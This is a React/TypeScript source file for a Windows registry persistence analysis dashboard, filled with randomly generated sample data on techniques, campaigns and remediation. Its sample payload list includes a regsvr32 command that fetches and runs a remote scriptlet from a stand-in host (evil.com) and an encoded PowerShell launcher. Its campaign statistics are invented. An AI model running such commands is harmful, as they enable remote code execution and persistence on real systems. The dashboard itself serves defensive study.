/**
 * Registry Persistence Vectors Analysis
 * Comprehensive analysis of Windows registry-based persistence mechanisms
 */

import React, { useState, useEffect, useMemo, useCallback } from 'react';
import {
  Box,
  Grid,
  Card,
  CardContent,
  Typography,
  Button,
  IconButton,
  Chip,
  Avatar,
  LinearProgress,
  Alert,
  Tooltip,
  useTheme,
  alpha,
  Paper,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  TablePagination,
  TextField,
  FormControl,
  InputLabel,
  Select,
  MenuItem,
  CircularProgress,
  Tabs,
  Tab,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  Badge,
  Accordion,
  AccordionSummary,
  AccordionDetails,
} from '@mui/material';

import {
  Settings,
  Security,
  Warning,
  Assessment,
  TrendingUp,
  Shield,
  BugReport,
  Visibility,
  Search,
  Refresh,
  OpenInNew,
  CheckCircle,
  Error,
  Computer,
  Storage,
  VpnKey,
  ExpandMore,
  PlayArrow,
  Build,
  FileCopy,
  Memory,
  Lock,
} from '@mui/icons-material';

// Interfaces
interface RegistryPersistenceVector {
  id: string;
  name: string;
  registry_hive: 'HKLM' | 'HKCU' | 'HKCR' | 'HKU' | 'HKCC';
  registry_path: string;
  value_name?: string;
  persistence_type: 'startup' | 'service' | 'dll_hijack' | 'com_hijack' | 'wmi_event' | 'logon_script' | 'shell_extension' | 'debugger' | 'image_hijack';
  privilege_level: 'user' | 'admin' | 'system' | 'any';
  severity: 'low' | 'medium' | 'high' | 'critical';
  description: string;
  attack_techniques: string[];
  detection_methods: string[];
  evasion_capabilities: string[];
  payload_examples: string[];
  cleanup_difficulty: 'easy' | 'medium' | 'hard' | 'very_hard';
  stealth_rating: number;
  reliability_rating: number;
  compatibility: string[];
  common_payloads: string[];
  forensic_artifacts: string[];
  removal_methods: string[];
  prevention_controls: string[];
  real_world_usage: string[];
  mitre_techniques: string[];
  first_observed: Date;
  last_activity: Date;
  prevalence_score: number;
}

interface RegistryModification {
  id: string;
  operation: 'create' | 'modify' | 'delete' | 'query';
  hive: string;
  key_path: string;
  value_name: string;
  value_data: string;
  value_type: 'REG_SZ' | 'REG_DWORD' | 'REG_BINARY' | 'REG_MULTI_SZ' | 'REG_EXPAND_SZ';
  purpose: string;
  risk_level: 'low' | 'medium' | 'high' | 'critical';
  detection_signatures: string[];
  behavioral_indicators: string[];
  remediation_steps: string[];
  associated_malware: string[];
  campaign_usage: string[];
}

interface PersistenceCampaign {
  id: string;
  campaign_name: string;
  threat_actor: string;
  start_date: Date;
  end_date?: Date;
  registry_techniques_used: string[];
  target_environments: string[];
  affected_systems: number;
  detection_evasion_rate: number;
  persistence_duration: string;
  primary_objectives: string[];
  geographic_distribution: string[];
  attack_sophistication: 'basic' | 'intermediate' | 'advanced' | 'expert';
  attribution_confidence: 'low' | 'medium' | 'high' | 'very_high';
}

interface RegistryMetrics {
  total_vectors: number;
  high_risk_techniques: number;
  active_campaigns: number;
  detection_coverage: number;
  hive_distribution: { [key: string]: number };
  persistence_type_distribution: { [key: string]: number };
  privilege_level_distribution: { [key: string]: number };
  avg_stealth_rating: number;
  avg_reliability: number;
  most_targeted_keys: string[];
}

const RegistryPersistenceVectors: React.FC = () => {
  const theme = useTheme();
  
  // State management
  const [vectors, setVectors] = useState<RegistryPersistenceVector[]>([]);
  const [modifications, setModifications] = useState<RegistryModification[]>([]);
  const [campaigns, setCampaigns] = useState<PersistenceCampaign[]>([]);
  const [metrics, setMetrics] = useState<RegistryMetrics | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  
  // Selection states
  const [selectedVector, setSelectedVector] = useState<RegistryPersistenceVector | null>(null);
  const [selectedModification, setSelectedModification] = useState<RegistryModification | null>(null);
  
  // UI states
  const [activeTab, setActiveTab] = useState(0);
  const [detailsOpen, setDetailsOpen] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [filterHive, setFilterHive] = useState<string>('all');
  const [filterType, setFilterType] = useState<string>('all');
  const [filterSeverity, setFilterSeverity] = useState<string>('all');
  const [page, setPage] = useState(0);
  const [rowsPerPage, setRowsPerPage] = useState(10);

  // Simulated data generation
  const generateRegistryData = useCallback(() => {
    const hives = ['HKLM', 'HKCU', 'HKCR', 'HKU', 'HKCC'] as const;
    const persistenceTypes = ['startup', 'service', 'dll_hijack', 'com_hijack', 'wmi_event', 'logon_script', 'shell_extension', 'debugger', 'image_hijack'] as const;
    const privilegeLevels = ['user', 'admin', 'system', 'any'] as const;
    const severityLevels = ['low', 'medium', 'high', 'critical'] as const;
    const windowsVersions = ['Windows 7', 'Windows 8', 'Windows 10', 'Windows 11', 'Windows Server 2012', 'Windows Server 2016', 'Windows Server 2019', 'Windows Server 2022'];

    // Common registry paths for persistence
    const commonPaths = [
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices',
      'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon',
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler',
      'SYSTEM\\CurrentControlSet\\Services',
      'SOFTWARE\\Classes\\exefile\\shell\\open\\command',
      'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options',
      'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Shell Extensions\\Approved',
      'SOFTWARE\\Microsoft\\Command Processor\\AutoRun'
    ];

    // Generate registry persistence vectors
    const vectorData: RegistryPersistenceVector[] = [];
    for (let i = 0; i < 20; i++) {
      const hive = hives[Math.floor(Math.random() * hives.length)];
      const persistenceType = persistenceTypes[Math.floor(Math.random() * persistenceTypes.length)];
      const privilegeLevel = privilegeLevels[Math.floor(Math.random() * privilegeLevels.length)];
      const severity = severityLevels[Math.floor(Math.random() * severityLevels.length)];
      const registryPath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
      
      vectorData.push({
        id: `vector-${i + 1}`,
        name: `${persistenceType.replace('_', ' ')} Persistence Vector ${i + 1}`,
        registry_hive: hive,
        registry_path: registryPath,
        value_name: `malicious_entry_${i + 1}`,
        persistence_type: persistenceType,
        privilege_level: privilegeLevel,
        severity: severity as any,
        description: `Registry-based persistence using ${persistenceType.replace('_', ' ')} in ${hive}\\${registryPath}`,
        attack_techniques: [
          'Registry modification',
          'Autostart execution',
          'Process injection',
          'DLL hijacking',
          'Service installation'
        ],
        detection_methods: [
          'Registry monitoring',
          'Process creation monitoring',
          'File integrity monitoring',
          'Behavioral analysis',
          'YARA rules'
        ],
        evasion_capabilities: [
          'Legitimate location abuse',
          'Value name obfuscation',
          'Binary padding',
          'Time-based activation',
          'Conditional execution'
        ],
        payload_examples: [
          'rundll32.exe malicious.dll,DllRegisterServer',
          'powershell.exe -enc <base64_payload>',
          'cmd.exe /c echo malicious_command',
          'regsvr32.exe /s /n /u /i:http://evil.com/script.sct scrobj.dll'
        ],
        cleanup_difficulty: ['easy', 'medium', 'hard', 'very_hard'][Math.floor(Math.random() * 4)] as any,
        stealth_rating: Math.floor(Math.random() * 10) + 1,
        reliability_rating: Math.floor(Math.random() * 10) + 1,
        compatibility: windowsVersions.slice(0, Math.floor(Math.random() * 4) + 2),
        common_payloads: [
          'Backdoor installers',
          'RAT components',
          'Cryptocurrency miners',
          'Data theft tools',
          'Ransomware droppers'
        ],
        forensic_artifacts: [
          'Registry modification timestamps',
          'Process execution logs',
          'File system artifacts',
          'Event log entries',
          'Prefetch files'
        ],
        removal_methods: [
          'Registry key deletion',
          'System restore',
          'Antimalware scanning',
          'Manual cleanup',
          'Registry backup restoration'
        ],
        prevention_controls: [
          'Registry access controls',
          'Application whitelisting',
          'Behavioral monitoring',
          'User privilege restriction',
          'Registry integrity monitoring'
        ],
        real_world_usage: [
          'APT campaigns',
          'Banking trojans',
          'Ransomware families',
          'Cryptocurrency miners',
          'State-sponsored attacks'
        ],
        mitre_techniques: [
          'T1547.001',
          'T1574',
          'T1546',
          'T1112',
          'T1543'
        ],
        first_observed: new Date(Date.now() - Math.random() * 1000 * 24 * 60 * 60 * 1000),
        last_activity: new Date(Date.now() - Math.random() * 30 * 24 * 60 * 60 * 1000),
        prevalence_score: Math.floor(Math.random() * 100) + 10
      });
    }

    // Generate registry modifications
    const modificationData: RegistryModification[] = [];
    const operations = ['create', 'modify', 'delete', 'query'] as const;
    const valueTypes = ['REG_SZ', 'REG_DWORD', 'REG_BINARY', 'REG_MULTI_SZ', 'REG_EXPAND_SZ'] as const;
    
    for (let i = 0; i < 15; i++) {
      const operation = operations[Math.floor(Math.random() * operations.length)];
      const hive = hives[Math.floor(Math.random() * hives.length)];
      const keyPath = commonPaths[Math.floor(Math.random() * commonPaths.length)];
      const valueType = valueTypes[Math.floor(Math.random() * valueTypes.length)];
      
      modificationData.push({
        id: `mod-${i + 1}`,
        operation,
        hive,
        key_path: keyPath,
        value_name: `persistence_${i + 1}`,
        value_data: operation === 'create' || operation === 'modify' ? 
          'C:\\Windows\\System32\\malicious.exe' : '',
        value_type: valueType,
        purpose: `${operation.charAt(0).toUpperCase() + operation.slice(1)} persistence mechanism`,
        risk_level: severityLevels[Math.floor(Math.random() * severityLevels.length)] as any,
        detection_signatures: [
          'Registry write to suspicious location',
          'Executable in registry value',
          'Unusual registry access pattern',
          'Non-standard value name format'
        ],
        behavioral_indicators: [
          'Process spawning from registry',
          'Network connections after registry modification',
          'File creation in system directories',
          'Service installation attempts'
        ],
        remediation_steps: [
          'Remove malicious registry entries',
          'Scan for related artifacts',
          'Monitor for reinfection',
          'Update security policies'
        ],
        associated_malware: [
          'TrickBot',
          'Emotet',
          'Cobalt Strike',
          'Metasploit',
          'Empire'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        campaign_usage: [
          'Operation Registry Storm',
          'Persistent Threat Campaign',
          'Advanced Registry Attack'
        ]
      });
    }

    // Generate persistence campaigns
    const campaignData: PersistenceCampaign[] = [];
    for (let i = 0; i < 8; i++) {
      const startDate = new Date(Date.now() - Math.random() * 365 * 24 * 60 * 60 * 1000);
      
      campaignData.push({
        id: `campaign-${i + 1}`,
        campaign_name: `Registry Persistence Campaign ${i + 1}`,
        threat_actor: `APT-${Math.floor(Math.random() * 50) + 1}`,
        start_date: startDate,
        end_date: Math.random() > 0.3 ? new Date(startDate.getTime() + Math.random() * 180 * 24 * 60 * 60 * 1000) : undefined,
        registry_techniques_used: persistenceTypes.slice(0, Math.floor(Math.random() * 4) + 1),
        target_environments: [
          'Corporate networks',
          'Government agencies',
          'Financial institutions',
          'Healthcare organizations'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        affected_systems: Math.floor(Math.random() * 50000) + 1000,
        detection_evasion_rate: Math.floor(Math.random() * 80) + 10,
        persistence_duration: `${Math.floor(Math.random() * 365) + 30} days`,
        primary_objectives: [
          'Long-term access',
          'Data exfiltration',
          'Espionage',
          'Ransomware deployment',
          'Cryptocurrency mining'
        ].slice(0, Math.floor(Math.random() * 3) + 1),
        geographic_distribution: ['North America', 'Europe', 'Asia', 'Global'].slice(0, Math.floor(Math.random() * 3) + 1),
        attack_sophistication: ['basic', 'intermediate', 'advanced', 'expert'][Math.floor(Math.random() * 4)] as any,
        attribution_confidence: ['low', 'medium', 'high', 'very_high'][Math.floor(Math.random() * 4)] as any
      });
    }

    // Generate metrics
    const hiveDist = hives.reduce((acc, hive) => {
      acc[hive] = vectorData.filter(v => v.registry_hive === hive).length;
      return acc;
    }, {} as { [key: string]: number });

    const typeDist = persistenceTypes.reduce((acc, type) => {
      acc[type] = vectorData.filter(v => v.persistence_type === type).length;
      return acc;
    }, {} as { [key: string]: number });

    const privilegeDist = privilegeLevels.reduce((acc, level) => {
      acc[level] = vectorData.filter(v => v.privilege_level === level).length;
      return acc;
    }, {} as { [key: string]: number });

    const metricsData: RegistryMetrics = {
      total_vectors: vectorData.length,
      high_risk_techniques: vectorData.filter(v => v.severity === 'high' || v.severity === 'critical').length,
      active_campaigns: campaignData.filter(c => !c.end_date).length,
      detection_coverage: Math.floor(Math.random() * 30) + 65,
      hive_distribution: hiveDist,
      persistence_type_distribution: typeDist,
      privilege_level_distribution: privilegeDist,
      avg_stealth_rating: Math.floor(vectorData.reduce((sum, v) => sum + v.stealth_rating, 0) / vectorData.length),
      avg_reliability: Math.floor(vectorData.reduce((sum, v) => sum + v.reliability_rating, 0) / vectorData.length),
      most_targeted_keys: commonPaths.slice(0, 5)
    };

    setVectors(vectorData);
    setModifications(modificationData);
    setCampaigns(campaignData);
    setMetrics(metricsData);
    setLoading(false);
  }, []);

  useEffect(() => {
    generateRegistryData();
  }, [generateRegistryData]);

  // Filtered data
  const filteredVectors = useMemo(() => {
    return vectors.filter(vector => {
      const matchesSearch = vector.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           vector.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
                           vector.registry_path.toLowerCase().includes(searchTerm.toLowerCase());
      const matchesHive = filterHive === 'all' || vector.registry_hive === filterHive;
      const matchesType = filterType === 'all' || vector.persistence_type === filterType;
      const matchesSeverity = filterSeverity === 'all' || vector.severity === filterSeverity;
      
      return matchesSearch && matchesHive && matchesType && matchesSeverity;
    });
  }, [vectors, searchTerm, filterHive, filterType, filterSeverity]);

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return theme.palette.error.main;
      case 'high': return '#ff9800';
      case 'medium': return theme.palette.warning.main;
      case 'low': return theme.palette.success.main;
      default: return theme.palette.grey[500];
    }
  };

  const getHiveIcon = (hive: string) => {
    switch (hive) {
      case 'HKLM': return <Computer />;
      case 'HKCU': return <VpnKey />;
      case 'HKCR': return <Build />;
      case 'HKU': return <Security />;
      case 'HKCC': return <Settings />;
      default: return <Storage />;
    }
  };

  const getTypeIcon = (type: string) => {
    switch (type) {
      case 'startup': return <PlayArrow />;
      case 'service': return <Settings />;
      case 'dll_hijack': return <FileCopy />;
      case 'com_hijack': return <Build />;
      case 'wmi_event': return <Memory />;
      default: return <Storage />;
    }
  };

  // Render overview metrics
  const renderOverviewMetrics = () => (
    <Grid container spacing={3} sx={{ mb: 3 }}>
      {[
        { label: 'Total Vectors', value: metrics?.total_vectors || 0, icon: <Storage />, color: theme.palette.primary.main },
        { label: 'High Risk', value: metrics?.high_risk_techniques || 0, icon: <Warning />, color: theme.palette.error.main },
        { label: 'Active Campaigns', value: metrics?.active_campaigns || 0, icon: <TrendingUp />, color: theme.palette.warning.main },
        { label: 'Detection Coverage', value: `${metrics?.detection_coverage || 0}%`, icon: <Shield />, color: theme.palette.success.main }
      ].map((metric, index) => (
        <Grid item xs={12} sm={6} lg={3} key={index}>
          <Card>
            <CardContent>
              <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                <Box>
                  <Typography variant="h4" fontWeight="bold">
                    {metric.value}
                  </Typography>
                  <Typography variant="body2" color="textSecondary">
                    {metric.label}
                  </Typography>
                </Box>
                <Avatar sx={{ bgcolor: alpha(metric.color, 0.1), color: metric.color }}>
                  {metric.icon}
                </Avatar>
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render vectors table
  const renderVectorsTable = () => (
    <TableContainer component={Paper}>
      <Table>
        <TableHead>
          <TableRow>
            <TableCell>Vector Name</TableCell>
            <TableCell>Hive</TableCell>
            <TableCell>Type</TableCell>
            <TableCell>Severity</TableCell>
            <TableCell>Privilege Level</TableCell>
            <TableCell>Stealth Rating</TableCell>
            <TableCell>Reliability</TableCell>
            <TableCell>Actions</TableCell>
          </TableRow>
        </TableHead>
        <TableBody>
          {filteredVectors
            .slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)
            .map((vector) => (
              <TableRow key={vector.id} hover>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getTypeIcon(vector.persistence_type)}
                    <Typography variant="body2">{vector.name}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    {getHiveIcon(vector.registry_hive)}
                    <Typography variant="body2">{vector.registry_hive}</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Chip size="small" label={vector.persistence_type.replace('_', ' ')} />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.severity}
                    sx={{
                      bgcolor: alpha(getSeverityColor(vector.severity), 0.1),
                      color: getSeverityColor(vector.severity)
                    }}
                  />
                </TableCell>
                <TableCell>
                  <Chip
                    size="small"
                    label={vector.privilege_level}
                    color={vector.privilege_level === 'system' ? 'error' : 
                           vector.privilege_level === 'admin' ? 'warning' : 'default'}
                  />
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.stealth_rating * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.stealth_rating > 7 ? 'error' : vector.stealth_rating > 4 ? 'warning' : 'success'}
                    />
                    <Typography variant="caption">{vector.stealth_rating}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                    <LinearProgress
                      variant="determinate"
                      value={vector.reliability_rating * 10}
                      sx={{ flexGrow: 1, height: 6, borderRadius: 3 }}
                      color={vector.reliability_rating > 7 ? 'success' : vector.reliability_rating > 4 ? 'warning' : 'error'}
                    />
                    <Typography variant="caption">{vector.reliability_rating}/10</Typography>
                  </Box>
                </TableCell>
                <TableCell>
                  <IconButton
                    size="small"
                    onClick={() => {
                      setSelectedVector(vector);
                      setDetailsOpen(true);
                    }}
                  >
                    <Visibility />
                  </IconButton>
                </TableCell>
              </TableRow>
            ))}
        </TableBody>
      </Table>
      <TablePagination
        component="div"
        count={filteredVectors.length}
        page={page}
        onPageChange={(_, newPage) => setPage(newPage)}
        rowsPerPage={rowsPerPage}
        onRowsPerPageChange={(event) => {
          setRowsPerPage(parseInt(event.target.value, 10));
          setPage(0);
        }}
      />
    </TableContainer>
  );

  // Render registry modifications
  const renderModifications = () => (
    <Grid container spacing={3}>
      {modifications.map((modification) => (
        <Grid item xs={12} md={6} key={modification.id}>
          <Card 
            sx={{ 
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              '&:hover': {
                transform: 'translateY(-2px)',
                boxShadow: theme.shadows[4],
              }
            }}
            onClick={() => {
              setSelectedModification(modification);
              setDetailsOpen(true);
            }}
          >
            <CardContent>
              <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'start', mb: 2 }}>
                <Typography variant="h6" gutterBottom>
                  {modification.operation.toUpperCase()} Operation
                </Typography>
                <Chip
                  size="small"
                  label={modification.risk_level}
                  sx={{
                    bgcolor: alpha(getSeverityColor(modification.risk_level), 0.1),
                    color: getSeverityColor(modification.risk_level)
                  }}
                />
              </Box>
              <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 1, borderRadius: 1 }}>
                <Typography variant="caption" fontFamily="monospace" sx={{ wordBreak: 'break-all' }}>
                  {modification.hive}\\{modification.key_path}
                </Typography>
              </Box>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Value: {modification.value_name}
                </Typography>
                <Typography variant="caption" display="block">
                  Type: {modification.value_type}
                </Typography>
                <Typography variant="caption" display="block">
                  Purpose: {modification.purpose}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {modification.associated_malware.slice(0, 2).map((malware) => (
                  <Chip key={malware} size="small" label={malware} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  // Render campaigns
  const renderCampaigns = () => (
    <Grid container spacing={3}>
      {campaigns.map((campaign) => (
        <Grid item xs={12} md={6} lg={4} key={campaign.id}>
          <Card>
            <CardContent>
              <Typography variant="h6" gutterBottom>
                {campaign.campaign_name}
              </Typography>
              <Typography variant="body2" color="textSecondary" gutterBottom>
                Actor: {campaign.threat_actor}
              </Typography>
              <Box sx={{ mb: 2 }}>
                <Typography variant="caption" display="block">
                  Affected Systems: {campaign.affected_systems.toLocaleString()}
                </Typography>
                <Typography variant="caption" display="block">
                  Evasion Rate: {campaign.detection_evasion_rate}%
                </Typography>
                <Typography variant="caption" display="block">
                  Duration: {campaign.persistence_duration}
                </Typography>
                <Typography variant="caption" display="block">
                  Sophistication: {campaign.attack_sophistication}
                </Typography>
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap', mb: 1 }}>
                {campaign.registry_techniques_used.slice(0, 2).map((technique) => (
                  <Chip key={technique} size="small" label={technique.replace('_', ' ')} />
                ))}
              </Box>
              <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
                {campaign.primary_objectives.slice(0, 2).map((objective) => (
                  <Chip key={objective} size="small" label={objective} variant="outlined" />
                ))}
              </Box>
            </CardContent>
          </Card>
        </Grid>
      ))}
    </Grid>
  );

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: 400 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ m: 2 }}>
        {error}
      </Alert>
    );
  }

  return (
    <Box sx={{ p: 3 }}>
      <Box sx={{ mb: 3 }}>
        <Typography variant="h4" gutterBottom>
          Registry Persistence Vectors
        </Typography>
        <Typography variant="body1" color="textSecondary">
          Comprehensive analysis of Windows registry-based persistence mechanisms and attack techniques
        </Typography>
      </Box>

      {renderOverviewMetrics()}

      <Card sx={{ mb: 3 }}>
        <CardContent>
          <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
            <TextField
              size="small"
              placeholder="Search vectors..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              InputProps={{
                startAdornment: <Search />
              }}
              sx={{ minWidth: 200 }}
            />
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Registry Hive</InputLabel>
              <Select
                value={filterHive}
                onChange={(e) => setFilterHive(e.target.value)}
                label="Registry Hive"
              >
                <MenuItem value="all">All Hives</MenuItem>
                <MenuItem value="HKLM">HKLM</MenuItem>
                <MenuItem value="HKCU">HKCU</MenuItem>
                <MenuItem value="HKCR">HKCR</MenuItem>
                <MenuItem value="HKU">HKU</MenuItem>
                <MenuItem value="HKCC">HKCC</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 150 }}>
              <InputLabel>Persistence Type</InputLabel>
              <Select
                value={filterType}
                onChange={(e) => setFilterType(e.target.value)}
                label="Persistence Type"
              >
                <MenuItem value="all">All Types</MenuItem>
                <MenuItem value="startup">Startup</MenuItem>
                <MenuItem value="service">Service</MenuItem>
                <MenuItem value="dll_hijack">DLL Hijack</MenuItem>
                <MenuItem value="com_hijack">COM Hijack</MenuItem>
                <MenuItem value="wmi_event">WMI Event</MenuItem>
                <MenuItem value="logon_script">Logon Script</MenuItem>
                <MenuItem value="shell_extension">Shell Extension</MenuItem>
                <MenuItem value="debugger">Debugger</MenuItem>
                <MenuItem value="image_hijack">Image Hijack</MenuItem>
              </Select>
            </FormControl>
            <FormControl size="small" sx={{ minWidth: 120 }}>
              <InputLabel>Severity</InputLabel>
              <Select
                value={filterSeverity}
                onChange={(e) => setFilterSeverity(e.target.value)}
                label="Severity"
              >
                <MenuItem value="all">All Severities</MenuItem>
                <MenuItem value="critical">Critical</MenuItem>
                <MenuItem value="high">High</MenuItem>
                <MenuItem value="medium">Medium</MenuItem>
                <MenuItem value="low">Low</MenuItem>
              </Select>
            </FormControl>
            <Button startIcon={<Refresh />} onClick={generateRegistryData}>
              Refresh
            </Button>
          </Box>

          <Tabs value={activeTab} onChange={(_, newValue) => setActiveTab(newValue)} sx={{ mb: 3 }}>
            <Tab label="Persistence Vectors" />
            <Tab label="Registry Modifications" />
            <Tab label="Campaign Analysis" />
          </Tabs>

          {activeTab === 0 && renderVectorsTable()}
          {activeTab === 1 && renderModifications()}
          {activeTab === 2 && renderCampaigns()}
        </CardContent>
      </Card>

      {/* Details Dialog */}
      <Dialog
        open={detailsOpen}
        onClose={() => setDetailsOpen(false)}
        maxWidth="lg"
        fullWidth
      >
        <DialogTitle>
          {selectedVector?.name || selectedModification?.purpose}
        </DialogTitle>
        <DialogContent>
          {selectedVector && (
            <Grid container spacing={3}>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Vector Details
                  </Typography>
                  <Typography variant="body2" paragraph>
                    {selectedVector.description}
                  </Typography>
                  <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 1, borderRadius: 1 }}>
                    <Typography variant="caption" fontFamily="monospace">
                      {selectedVector.registry_hive}\\{selectedVector.registry_path}
                    </Typography>
                  </Box>
                  <Box sx={{ mb: 2 }}>
                    <Typography variant="caption" display="block">
                      Hive: {selectedVector.registry_hive}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Type: {selectedVector.persistence_type}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Privilege Level: {selectedVector.privilege_level}
                    </Typography>
                    <Typography variant="caption" display="block">
                      Stealth Rating: {selectedVector.stealth_rating}/10
                    </Typography>
                  </Box>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Prevention Controls
                  </Typography>
                  <List dense>
                    {selectedVector.prevention_controls.slice(0, 5).map((control, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <Shield />
                        </ListItemIcon>
                        <ListItemText primary={control} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
          {selectedModification && (
            <Grid container spacing={3}>
              <Grid item xs={12}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="h6" gutterBottom>
                    Registry Modification Details
                  </Typography>
                  <Box sx={{ mb: 2, bgcolor: theme.palette.grey[100], p: 2, borderRadius: 1 }}>
                    <Typography variant="body2" fontFamily="monospace">
                      Operation: {selectedModification.operation.toUpperCase()}
                    </Typography>
                    <Typography variant="body2" fontFamily="monospace">
                      Path: {selectedModification.hive}\\{selectedModification.key_path}
                    </Typography>
                    <Typography variant="body2" fontFamily="monospace">
                      Value: {selectedModification.value_name}
                    </Typography>
                    <Typography variant="body2" fontFamily="monospace">
                      Data: {selectedModification.value_data}
                    </Typography>
                  </Box>
                  <Typography variant="body2" paragraph>
                    Purpose: {selectedModification.purpose}
                  </Typography>
                  <Typography variant="h6" gutterBottom sx={{ mt: 2 }}>
                    Remediation Steps
                  </Typography>
                  <List dense>
                    {selectedModification.remediation_steps.map((step, index) => (
                      <ListItem key={index}>
                        <ListItemIcon>
                          <CheckCircle />
                        </ListItemIcon>
                        <ListItemText primary={step} />
                      </ListItem>
                    ))}
                  </List>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button onClick={() => setDetailsOpen(false)}>
            Close
          </Button>
          <Button
            variant="outlined"
            startIcon={<OpenInNew />}
            onClick={() => window.open('https://attack.mitre.org/techniques/T1547/001/', '_blank')}
          >
            MITRE T1547.001
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default RegistryPersistenceVectors;